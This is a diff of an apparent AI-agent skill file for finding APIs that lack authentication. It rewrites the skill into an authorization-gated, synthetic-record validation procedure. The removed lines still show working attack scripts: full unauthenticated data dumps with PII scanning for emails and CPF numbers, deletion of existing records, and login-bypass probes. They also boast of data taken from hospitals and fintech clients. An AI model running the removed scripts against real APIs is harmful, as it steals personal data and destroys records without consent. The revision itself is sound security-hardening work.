@@ -1,6 +1,6 @@
 ---
 name: api-noauth-hunt
-description: Exploit no-auth APIs for data theft and CRUD via probes.
+description: Use when an API may expose data or privileged operations without authentication.
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
@@ -15,9 +15,12 @@ related_skills:
   - source-leak-hunt
 ---
 
-# API NoAuth Hunt Skill
+# API No-Authentication Validation
 
-Discover and exploit APIs that lack authentication entirely. This is the most impactful vulnerability class confirmed across multiple targets: TSData (59 contracts, full CRUD), enterprise-portal (1,082 tax clients, 60+ endpoints, CVSS 10.0), SemaMart (34 hospitals, plaintext passwords), fintech-processor (126,303 clients, 448 employees, Efí Bank API), and gov-finance-portal (389 AD users, 200 groups, 6 SQLi).
+Identify API operations that may be reachable without the authentication or
+authorization required by their data and business function. Discovery is
+read-only by default. Write validation uses synthetic records and requires
+explicit authorization immediately before execution.
 
 ## When to Use
 
@@ -48,12 +51,12 @@ done
 
 | Signal | What It Means | Action |
 |--------|---------------|--------|
-| HTTP 200 on `/api/users` or `/api/clients` | No-auth data access | Full dump |
-| HTTP 200 on POST without auth | Create/update possible | Test CRUD |
+| HTTP 200 on `/api/users` or `/api/clients` | Possible unauthenticated data access | Validate one bounded sample |
+| HTTP 2xx on POST without auth | Possible unauthenticated write | Stop and obtain write authorization |
 | OpenAPI/Swagger at `/docs`, `/swagger.json` | Full API map exposed | Enumerate all endpoints |
 | Stack trace on error | Internal paths, framework version | Map infrastructure |
-| DELETE via GET method | Improper HTTP method | Delete data, bypass CSRF |
-| Login without password validation | Any identifier grants access | Full account takeover |
+| State change via an unexpected method | Possible method-level authorization gap | Reproduce with a synthetic record |
+| Login without password validation | Possible authentication bypass | Verify with an approved test account |
 
 ## Procedure
 
@@ -142,134 +145,87 @@ for path, methods in paths.items():
 done
 ```
 
-### Phase 3 — Full CRUD Testing
+### Phase 3 — Authorized Synthetic CRUD Validation
+
+This phase changes server state. Run it only when the scope explicitly permits
+write testing and the endpoint stores disposable synthetic records. The guard
+below is deliberate: do not remove it or substitute an existing object ID.
 
 ```bash
 TARGET="$1"
-ENDPOINT="$2"  # e.g., /api/users or /api/clients
+ENDPOINT="$2"  # approved test collection
+OUTPUT_DIR="${OUTPUT_DIR:-./output}"
+PROBE_ID="noauth-test-$(date +%s)"
 
-echo "[*] CRUD testing on $TARGET$ENDPOINT"
-
-# READ (GET) — list all
-echo -n "  GET list: "
-count=$(curl -sk --max-time 10 --connect-timeout 5 "$TARGET$ENDPOINT" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 'object')" 2>/dev/null)
-echo "$count records"
-
-# READ (GET) — single item
-echo -n "  GET by ID (id=1): "
-code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 --connect-timeout 5 "$TARGET$ENDPOINT/1" 2>/dev/null)
-echo "HTTP $code"
-
-# CREATE (POST)
-echo -n "  POST create: "
-PROBE_DATA='{"test_probe":"noauth_test_'$(date +%s)'","created_by":"recon"}'
-code=$(curl -sk -X POST --max-time 10 --connect-timeout 5 "$TARGET$ENDPOINT" \
-  -H "Content-Type: application/json" -d "$PROBE_DATA" \
-  -o /dev/null -w "%{http_code}" 2>/dev/null)
-echo "HTTP $code"
-
-# UPDATE (PUT/PATCH)
-echo -n "  PUT update: "
-code=$(curl -sk -X PUT --max-time 10 --connect-timeout 5 "$TARGET$ENDPOINT/1" \
-  -H "Content-Type: application/json" -d "$PROBE_DATA" \
-  -o /dev/null -w "%{http_code}" 2>/dev/null)
-echo "HTTP $code"
-
-# DELETE
-echo -n "  DELETE (id=1): "
-code=$(curl -sk -X DELETE --max-time 10 --connect-timeout 5 "$TARGET$ENDPOINT/1" \
-  -o /dev/null -w "%{http_code}" 2>/dev/null)
-echo "HTTP $code"
-
-# Login bypass test (if /api/login or /api/auth exists)
-LOGIN_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 --connect-timeout 5 "$TARGET/api/login" 2>/dev/null)
-if [[ "$LOGIN_CODE" == "200" ]]; then
-  echo ""
-  echo "[*] Login endpoint found — testing bypass patterns:"
-
-  # Test 1: Empty credentials
-  echo -n "  Empty body: "
-  curl -sk -X POST --max-time 10 --connect-timeout 5 "$TARGET/api/login" -H "Content-Type: application/json" \
-    -d '{}' -o /dev/null -w "%{http_code}" 2>/dev/null
-  echo ""
-
-  # Test 2: No password
-  echo -n "  No password validation: "
-  curl -sk -X POST --max-time 10 --connect-timeout 5 "$TARGET/api/login" -H "Content-Type: application/json" \
-    -d '{"email":"admin@target.com"}' -o /tmp/login_test_$$.txt -w "%{http_code}" 2>/dev/null
-  if grep -qi "token\|session\|success" /tmp/login_test_$$.txt 2>/dev/null; then
-    echo "BYPASSED — no password required!"
-  else
-    echo "blocked"
-  fi
-
-  # Test 3: Type juggling
-  echo -n "  Type juggling: "
-  curl -sk -X POST --max-time 10 --connect-timeout 5 "$TARGET/api/login" -H "Content-Type: application/json" \
-    -d '{"password":true,"email":true}' -o /dev/null -w "%{http_code}" 2>/dev/null
-  echo ""
-  rm -f /tmp/login_test_$$.txt
+if [[ "${I_HAVE_EXPLICIT_WRITE_AUTHORIZATION:-no}" != "yes" ]]; then
+  echo "Refusing state-changing validation without explicit authorization." >&2
+  exit 1
 fi
+
+mkdir -p "$OUTPUT_DIR/api-validation"
+
+create_body=$(curl -sk --max-time 10 --connect-timeout 5 \
+  -X POST "$TARGET$ENDPOINT" \
+  -H "Content-Type: application/json" \
+  -d "{\"name\":\"$PROBE_ID\",\"test_record\":true}")
+printf '%s\n' "$create_body" \
+  > "$OUTPUT_DIR/api-validation/create-response.json"
+
+created_id=$(printf '%s' "$create_body" | jq -r '.id // .uuid // empty')
+if [[ -z "$created_id" ]]; then
+  echo "Create response did not expose a disposable object ID; stop here." >&2
+  exit 1
+fi
+
+curl -sk --max-time 10 --connect-timeout 5 \
+  "$TARGET$ENDPOINT/$created_id" \
+  -o "$OUTPUT_DIR/api-validation/read-response.json"
+
+curl -sk --max-time 10 --connect-timeout 5 \
+  -X PATCH "$TARGET$ENDPOINT/$created_id" \
+  -H "Content-Type: application/json" \
+  -d '{"validation_state":"updated"}' \
+  -o "$OUTPUT_DIR/api-validation/update-response.json"
+
+curl -sk --max-time 10 --connect-timeout 5 \
+  -X DELETE "$TARGET$ENDPOINT/$created_id" \
+  -o "$OUTPUT_DIR/api-validation/delete-response.txt"
 ```
 
-### Phase 4 — Data Extraction Pipeline
+### Phase 4 — Bounded Read Validation
 
 ```bash
 TARGET="$1"
 ENDPOINT="$2"  # confirmed no-auth endpoint
-OUTDIR="$OUTDIR/api_recon/data"
+OUTPUT_DIR="${OUTPUT_DIR:-./output}"
 
-echo "[*] Full data extraction from $TARGET$ENDPOINT"
+mkdir -p "$OUTPUT_DIR/api-validation"
+curl --max-time 15 --connect-timeout 5 -sk \
+  "$TARGET$ENDPOINT?page=1&limit=2" \
+  -o "$OUTPUT_DIR/api-validation/bounded-sample.json"
 
-# Extract ALL pages (handle pagination)
-PAGE=1
-PAGE_SIZE=100
-TOTAL=0
-
-while true; do
-  DATA=$(curl --max-time 30 --connect-timeout 10 -sk "$TARGET$ENDPOINT?page=$PAGE&limit=$PAGE_SIZE" 2>/dev/null)
-
-  # Also try offset-based pagination
-  if [[ "$PAGE" -eq 1 ]] && echo "$DATA" | grep -q "error\|not found"; then
-    DATA=$(curl --max-time 30 --connect-timeout 10 -sk "$TARGET$ENDPOINT?offset=0&limit=$PAGE_SIZE" 2>/dev/null)
-  fi
-
-  count=$(echo "$DATA" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 0)" 2>/dev/null)
-
-  if [[ "$count" -eq 0 ]]; then
-    break
-  fi
-
-  echo "$DATA" >> "$OUTDIR/${ENDPOINT//\//_}_page${PAGE}.json"
-  TOTAL=$((TOTAL + count))
-  echo "  Page $PAGE: $count records (total: $TOTAL)"
-
-  PAGE=$((PAGE + 1))
-  sleep 0.5  # Rate limit
-done
-
-echo "[+] Extracted $TOTAL records to $OUTDIR/"
-
-# PII scan on extracted data
-echo "[*] PII scan:"
-grep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$OUTDIR"/*.json 2>/dev/null | sort -u | head -10
-grep -Eo '[0-9]{3}\.[0-9]{3}\.[0-9]{3}-[0-9]{2}' "$OUTDIR"/*.json 2>/dev/null | head -5  # CPF
-grep -Eo '\b[0-9]{11}\b' "$OUTDIR"/*.json 2>/dev/null | head -5  # CPF (digits only)
+jq 'if type == "array" then .[:2] else . end' \
+  "$OUTPUT_DIR/api-validation/bounded-sample.json"
 ```
 
 
 ## Pitfalls
 
 - **HTTP 200 ≠ API.** Some services return HTML on unexpected paths. Verify JSON content type.
-- **Pagination limits.** APIs may cap at 100-1000 records per page. Check response headers for total count.
-- **Rate limiting on POST/PUT/DELETE.** Test with one request first; don't spam the API.
-- **DELETE is irreversible.** Verify with a test record before deleting real data.
-- **Login bypass tests can trigger alerts.** Use obvious test accounts.
+- **Pagination can turn validation into collection.** Request the smallest page
+  that proves the access-control failure. Do not enumerate the dataset.
+- **POST, PATCH, PUT, and DELETE change state.** Require explicit authorization
+  and operate only on a synthetic object created for the test.
+- **Authentication tests can lock accounts or trigger alerts.** Use approved
+  test identities and the agreed request rate.
 
 ## Verification
 
-- At least one endpoint MUST return structured data (JSON array or object) without authentication.
-- FULL CRUD: READ, CREATE, UPDATE, DELETE must all be confirmed functional.
-- PII scan: at least one type of PII must be identified in the extracted data.
-- Every no-auth endpoint must be documented with: URL, HTTP method, sample response, PII found.
-- Impact: the total number of exposed records must be quantified.
+- Confirm that the same operation succeeds without authentication and is
+  rejected by the expected negative control.
+- For reads, retain only the minimum sanitized sample needed to demonstrate the
+  protected data class.
+- For writes, record creation, retrieval, update, deletion, and cleanup of the
+  same synthetic object.
+- Document the URL, method, expected policy, observed behavior, identity,
+  timestamp, control result, and testing limit.
